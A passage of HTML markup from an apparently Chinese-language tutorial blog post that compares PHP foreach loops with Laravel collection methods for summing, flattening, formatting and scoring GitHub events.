class="line">        [<span class="string">'order_id'</span>=&gt;<span class="number">1</span>,<span class="string">'product_id'</span>=&gt;<span class="number">1</span>,<span class="string">'param'</span>=&gt;<span class="string">'7寸'</span>,<span class="string">'price'</span>=&gt;<span class="number">333.00</span>,<span class="string">'product'</span>=&gt;[<span class="string">'id'</span>=&gt;<span class="number">1</span>,<span class="string">'name'</span>=&gt;<span class="string">'蛋糕名称'</span>,<span class="string">'images'</span>=&gt;[]]],</span><br><span class="line">    ],</span><br><span class="line">]];</span><br></pre></td></tr></table></figure><ol><li><p>使用传统的foreach 方式进行遍历：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($orders <span class="keyword">as</span> $order) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($order[<span class="string">'order_products'</span>] <span class="keyword">as</span> $item) &#123;</span><br><span class="line">        $sum += $item[<span class="string">'price'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $sum;</span><br></pre></td></tr></table></figure></li><li><p>使用集合的map、flatten、sum：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$sum = collect($orders)-&gt;map(<span class="function"><span class="keyword">function</span><span class="params">($order)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $order[<span class="string">'order_products'</span>];</span><br><span class="line">&#125;)-&gt;flatten(<span class="number">1</span>)-&gt;map(<span class="function"><span class="keyword">function</span><span class="params">($order)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $order[<span class="string">'price'</span>];</span><br><span class="line">&#125;)-&gt;sum();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $sum;</span><br></pre></td></tr></table></figure></li></ol><p>map：遍历集合，返回一个新的集合。<br>flatten：将多维数组转换为一维。<br>sum：返回数组的和。</p><ol start="3"><li>使用集合的flatMap、pluck、sum：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sum = collect($orders)-&gt;flatMap(<span class="function"><span class="keyword">function</span><span class="params">($order)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $order[<span class="string">'order_products'</span>];</span><br><span class="line">&#125;)-&gt;pluck(<span class="string">'price'</span>)-&gt;sum();</span><br><span class="line"><span class="keyword">echo</span> $sum;</span><br></pre></td></tr></table></figure></li></ol><p>flatMap：和<code>map</code> 类似，不过区别在于<code>flatMap</code> 可以直接使用返回的新集合。</p><ol start="4"><li>使用集合的flatMap、sum：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sum = collect($orders)-&gt;flatMap(<span class="function"><span class="keyword">function</span><span class="params">($order)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $order[<span class="string">'order_products'</span>];</span><br><span class="line">&#125;)-&gt;sum(<span class="string">'price'</span>);</span><br></pre></td></tr></table></figure></li></ol><p>sum：可以接收一个列名作为参数进行求和。</p><h2 id="格式化数据"><a href="#格式化数据" class="headerlink" title="格式化数据"></a>格式化数据</h2><blockquote><p>需求：将如下结构的数组，格式化成下面的新数组。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 带格式化数组</span></span><br><span class="line">$gates = [</span><br><span class="line">    <span class="string">'BaiYun_A_A17'</span>,</span><br><span class="line">    <span class="string">'BeiJing_J7'</span>,</span><br><span class="line">    <span class="string">'ShuangLiu_K203'</span>,</span><br><span class="line">    <span class="string">'HongQiao_A157'</span>,</span><br><span class="line">    <span class="string">'A2'</span>,</span><br><span class="line">    <span class="string">'BaiYun_B_B230'</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 新数组</span></span><br><span class="line">$boards = [</span><br><span class="line">    <span class="string">'A17'</span>,</span><br><span class="line">    <span class="string">'J7'</span>,</span><br><span class="line">    <span class="string">'K203'</span>,</span><br><span class="line">    <span class="string">'A157'</span>,</span><br><span class="line">    <span class="string">'A2'</span>,</span><br><span class="line">    <span class="string">'B230'</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><ol><li><p>使用foreach 进行遍历：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$res = [];</span><br><span class="line"><span class="keyword">foreach</span>($gates <span class="keyword">as</span> $key =&gt; $gate) &#123;</span><br><span class="line">    <span class="keyword">if</span>(strpos($gate, <span class="string">'_'</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">        $res[$key] = $gate;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $offset = strrpos($gate, <span class="string">'_'</span>) + <span class="number">1</span>;</span><br><span class="line">        $res[$key] = mb_substr($gate , $offset);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var_dump($res);</span><br></pre></td></tr></table></figure></li><li><p>使用集合的map以及php 的explode、end：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$res = collect($gates)-&gt;map(<span class="function"><span class="keyword">function</span><span class="params">($gate)</span> </span>&#123;</span><br><span class="line">    $parts = explode(<span class="string">'_'</span>, $gate);</span><br><span class="line">    <span class="keyword">return</span> end($parts);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>使用集合的map、explode、last、toArray：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$res = collect($gates)-&gt;map(<span class="function"><span class="keyword">function</span><span class="params">($gate)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> collect(explode(<span class="string">'_'</span>, $gate))-&gt;last();</span><br><span class="line">&#125;)-&gt;toArray();</span><br></pre></td></tr></table></figure></li></ol><p>explode：将字符串进行分割成数组<br>last：获取最后一个元素</p><h2 id="统计GitHub-Event"><a href="#统计GitHub-Event" class="headerlink" title="统计GitHub Event"></a>统计GitHub Event</h2><p>首先，通过此<a href="https://api.github.com/users/YOUR_USRE_NAME/events" target="_blank" rel="noopener">链接</a>获取到个人事件json。</p><p>一个 <code>PushEvent计</code> 5 分，一个 <code>CreateEvent</code> 计 4 分，一个 <code>IssueCommentEvent计</code> 3 分，一个 <code>IssueCommentEvent</code> 计 2 分，除此之外的其它类型的事件计 1 分，计算当前用户的时间得分总和。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$opts = [</span><br><span class="line">        <span class="string">'http'</span> =&gt; [</span><br><span class="line">                <span class="string">'method'</span> =&gt; <span class="string">'GET'</span>,</span><br><span class="line">                <span class="string">'header'</span> =&gt; [</span><br><span class="line">                        <span class="string">'User-Agent: PHP'</span></span><br><span class="line">                ]</span><br><span class="line">        ]</span><br><span class="line">];</span><br><span class="line">$context = stream_context_create($opts);</span><br><span class="line">$events = json_decode(file_get_contents(<span class="string">'http://api.github.com/users/0xAiKang/events'</span>, <span class="keyword">false</span>, $context), <span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><ol><li>传统foreach 方式：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$eventTypes = []; <span class="comment">// 事件类型</span></span><br><span class="line">$score = <span class="number">0</span>; <span class="comment">// 总得分</span></span><br><span class="line"><span class="keyword">foreach</span> ($events <span class="keyword">as</span> $event) &#123;</span><br><span class="line">    $eventTypes[] = $event[<span class="string">'type'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($eventTypes <span class="keyword">as</span> $eventType) &#123;</span><br><span class="line">    <span class="keyword">switch</span> ($eventType) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'PushEvent'</span>:</span><br><span class="line">        $score += <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'CreateEvent'</span>:</span><br><span class="line">        $score += <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'IssueEvent'</span>:</span><br><span class="line">        $score += <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'IssueCommentEvent'</span>:</span><br><span class="line">        $score += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">        $score += <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>使用集合的map、pluck、sum 方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$score = $events-&gt;pluck(<span class="string">'type'</span>)-&gt;map(<span class="function"><span class="keyword">function</span><span class="params">($eventType)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">switch</span> ($eventType) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'PushEvent'</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'CreateEvent'</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'IssueEvent'</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'IssueCommentEvent'</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)-&gt;sum();</span><br></pre></td></tr></table></figure><p>使用集合的链式编程，可以很好地解决上面那种多次遍历的问题。</p></li><li><p>使用集合中的map、pluck、get 方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$score = $events-&gt;pluck(<span class="string">'type'</span>)-&gt;map(<span class="function"><span class="keyword">function</span><span class="params">($eventType)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> collect([</span><br><span class="line">       <span class="string">'PushEvent'</span>=&gt; <span class="number">5</span>,</span><br><span class="line">       <span class="string">'CreateEvent'</span>=&gt; <span class="number">4</span>,</span><br><span class="line">       <span class="string">'IssueEvent'</span>=&gt; <span class="number">3</span>,</span><br><span class="line">       <span class="string">'IssueCommentEvent'</span>=&gt; <span class="number">2</span></span><br><span class="line">   ])-&gt;get($eventType, <span class="number">1</span>); <span class="comment">// 如果不存在则默认等于1</span></span><br><span class="line">&#125;)-&gt;sum();</span><br></pre></td></tr></table></figure></li><li><p>尝试将该需求，封装成一个类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GithubScore</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $events;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">score</span><span class="params">($events)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> <span class="keyword">static</span>($events))-&gt;scoreEvents();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">scoreEvents</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;events-&gt;pluck(<span class="string">'type'</span>)-&gt;map(<span class="function"><span class="keyword">function</span><span class="params">($eventType)</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;lookupEventScore($eventType, <span class="number">1</span>);</span><br><span class="line">        &#125;)-&gt;sum();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">lookupEventScore</span><span class="params">($eventType, $default_value)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> collect([</span><br><span class="line">           <span class="string">'PushEvent'</span>=&gt; <span class="number">5</span>,</span><br><span class="line">           <span class="string">'CreateEvent'</span>=&gt; <span class="number">4</span>,</span><br><span class="line">           <span class="string">'IssueEvent'</span>=&gt; <span class="number">3</span>,</span><br><span class="line">           <span class="string">'IssueCommentEvent'</span>=&gt; <span class="number">2</span></span><br><span class="line">       ])-&gt;get($eventType, $default_value); <span class="comment">// 如果不存在则默认等于1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var_dump(GithubScore::score($events));</span><br></pre></td></tr></table></figure></li></ol><h2 id="格式化数据-1"><a href="#格式化数据-1" class="headerlink" title="格式化数据"></a>格式化数据</h2><blockquote><p>需求：将以下数据格式化成新的结构。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$messages = [</span><br><span class="line">    <span class="string">'Should be working now for all Providers.'</span>,</span><br><span class="line">    <span class="string">'If you see one where spaces are in the title let me know.'</span>,</span><br><span class="line">    <span class="string">'But there should not have blank in the key of config or .env file.'</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 格式化之后的结果</span></span><br><span class="line">- Should be working now <span class="keyword">for</span> all Providers. \n</span><br><span class="line">- <span class="keyword">If</span> you see one where spaces are in the title let me know. \n</span><br><span class="line">- But there should not have blank in the key of config <span class="keyword">or</span> .env file.</span><br></pre></td></tr></table></figure><ol><li><p>传统的foreach 方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$comment = <span class="string">'- '</span> . array_shift($messages);</span><br><span class="line"><span class="keyword">foreach</span> ($messages <span class="keyword">as</span> $message) &#123;</span><br><span class="line">    $comment .= <span class="string">"\n -  $&#123;message&#125;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump($comment);</span><br></pre></td></tr></table></figure></li><li><p>使用集合的map、implode方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$comment = collect($messages)-&gt;map(<span class="function"><span class="keyword">function</span><span class="params">($message)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'- '</span> . $message;</span><br><span class="line">&#125;)-&gt;implode(<span class="string">"\n"</span>);</span><br><span class="line">var_dump($comment);</span><br></pre></td></tr></table></figure></li></ol><h2 id="多个数组求差"><a href="#多个数组求差" class="headerlink" title="多个数组求差"></a>多个数组求差</h2><blockquote><p>需求：两组数据分别代表去年的营收和今年的营收，求每个月的盈亏情况。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$lastYear = [</span><br><span class="line">    <span class="number">6345.75</span>,</span><br><span class="line">    <span class="number">9839.45</span>,</span><br><span class="line">    <span class="number">7134.60</span>,</span><br><span class="line">    <span class="number">9479.50</span>,</span><br><span class="line">    <span class="number">9928.0</span>,</span><br><span class="line">    <span class="number">8652.00</span>,</span><br><span class="line">    <span class="number">7658.40</span>,</span><br><span class="line">    <span class="number">10245.40</span>,</span><br><span class="line">    <span class="number">7889.40</span>,</span><br><span class="line">    <span class="number">3892.40</span>,</span><br><span class="line">    <span class="number">3638.40</span>,</span><br><span class="line">    <span class="number">2339.40</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$thisYear = [</span><br><span class="line">    <span class="number">6145.75</span>,</span><br><span class="line">    <span class="number">6895.00</span>,</span><br><span class="line">    <span class="number">3434.00</span>,</span><br><span class="line">    <span class="number">9349350</span>,</span><br><span class="line">    <span class="number">9478.60</span>,</span><br><span class="line">    <span class="number">7652.80</span>,</span><br><span class="line">    <span class="number">4758.40</span>,</span><br><span class="line">    <span class="number">10945.40</span>,</span><br><span class="line">    <span class="number">3689.40</span>,</span><br><span class="line">    <span class="number">8992.40</span>,</span><br><span class="line">    <span class="number">7588.40</span>,</span><br><span class="line">    <span class="number">2239.40</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><ol><li><p>传统的foreach 方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$profit = [];</span><br><span class="line"><span class="keyword">foreach</span>($thisYear <span class="keyword">as</span> $key =&gt; $monthly)&#123;</span><br><span class="line">    $profit[$key] = $monthly - $lastYear[$key];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($profit);</span><br></pre></td></tr></table></figure></li><li><p>使用集合的zip、first、last：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$profit = collect($thisYear)-&gt;zip($lastYear)-&gt;map(<span class="function"><span class="keyword">function</span><span class="params">($monthly)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $monthly-&gt;first() - $monthly-&gt;last();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>zip：将给定数组的值与相应索引处的原集合的值合并在一起。</p></li></ol><h2 id="创建lookup-数组"><a href="#创建lookup-数组" class="headerlink" title="创建lookup 数组"></a>创建lookup 数组</h2><blockquote><p>需求：将如下数组格式化成下面的结果：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$employees = [</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'name'</span> =&gt; <span class="string">'example'</span>,</span><br><span class="line">        <span class="string">'email'</span> =&gt; <span class="string">'example@exmaple.com'</span>,</span><br><span class="line">        <span class="string">'company'</span> =&gt; <span class="string">'example Inc.'</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'name'</span> =&gt; <span class="string">'Lucy'</span>,</span><br><span class="line">        <span class="string">'email'</span> =&gt; <span class="string">'lucy@example.com'</span>,</span><br><span class="line">        <span class="string">'company'</span> =&gt; <span class="string">'ibm Inc.'</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'name'</span> =&gt; <span class="string">'Taylor'</span>,</span><br><span class="line">        <span class="string">'email'</span> =&gt; <span class="string">'toylor@laravel.com'</span>,</span><br><span class="line">        <span class="string">'company'</span>=&gt;<span class="string">'Laravel Inc.'</span></span><br><span class="line">    ]</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 格式化之后的结果</span></span><br><span class="line">$lookup = [</span><br><span class="line">    <span class="string">'example'</span> =&gt; <span class="string">'example@example.com'</span>,</span><br><span class="line">    <span class="string">'Lucy'</span> =&gt; ‘lucy@example.com’,</span><br><span class="line">    <span class="string">'Taylor'</span>=&gt; <span class="string">'toylor@laravel.com'</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><ol><li><p>传统的foreach 方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$emails = [];</span><br><span class="line"><span class="keyword">foreach</span> ($employees <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    $emails[$value[<span class="string">'name'</span>]] = $value[<span class="string">'email'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>使用集合的reduce 方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$emails = collect($employees)-&gt;reduce(<span class="function"><span class="keyword">function</span><span class="params">($emailLookup, $employee)</span></span>&#123;</span><br><span class="line">    $emailLookup[$employee[<span class="string">'name'</span>]] = $employee[<span class="string">'email'</span>];</span><br><span class="line">    <span class="keyword">return</span> $emailLookup;</span><br><span class="line">&#125;,[]);</span><br></pre></td></tr></table></figure></li></ol><p>reduce：将每次迭代的结果传递给下一次迭代直到集合减少为单个值。</p><ol start="3"><li>使用集合的pluck 方法：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$emails = collect($employees)-&gt;pluck(<span class="string">'name'</span>, <span class="string">'email'</span>);</span><br></pre></td></tr></table></figure></li></ol><h2 id="返回一维数组"><a href="#返回一维数组" class="headerlink" title="返回一维数组"></a>返回一维数组</h2><p>需求：将下面的二维数组，转换为一维数组。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$nums = [</span><br><span class="line">    [</span><br><span class="line">        <span class="number">188</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="number">238</span>,</span><br><span class="line">        <span class="number">383</span>,</span><br><span class="line">        <span class="number">123</span>,</span><br><span class="line">        <span class="number">348</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="number">23</span>,</span><br><span class="line">        <span class="number">87</span>,</span><br><span class="line">        <span class="number">348</span>,</span><br><span class="line">        <span class="number">98</span>,</span><br><span class="line">    ]</span><br><span class="line">];</span><br></pre></td></tr></table></figure><ol><li>传统foreach 方式：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$result = [];</span><br><span class="line"><span class="keyword">foreach</span> ($nums <span class="keyword">as</span> $value) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($value <span class="keyword">as</span> $num) &#123;</span><br><span class="line">        $result[] = $num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>使用集合的flatten、map：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$result = collect($nums)-&gt;flatten(<span class="number">1</span>)-&gt;map(<span class="function"><span class="keyword">function</span> <span class="params">($num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $num;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ol><h2 id="求和-1"><a href="#求和-1" class="headerlink" title="求和"></a>求和</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$orders = [</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span> =&gt; <span class="string">"1000"</span>,</span><br><span class="line">        <span class="string">"price"</span> =&gt; <span class="number">80</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span> =&gt; <span class="string">"1001"</span>,</span><br><span class="line">        <span class="string">"price"</span> =&gt; <span class="number">120</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span> =&gt; <span class="string">"1002"</span>,</span><br><span class="line">        <span class="string">"price"</span> =&gt; <span class="number">30</span>,</span><br><span class="line">    ],</span><br><span class="line">];</span><br></pre></td></tr></table></figure><ol><li>传统foreach方式：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$total_price = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($orders <span class="keyword">as</span> $order) &#123;</span><br><span class="line">    $total_price += $order[<span class="string">"price"</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li><p>array 函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$total_price = array_sum(array_column($orders, <span class="string">"price"</span>));</span><br></pre></td></tr></table></figure></li><li><p>使用集合：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 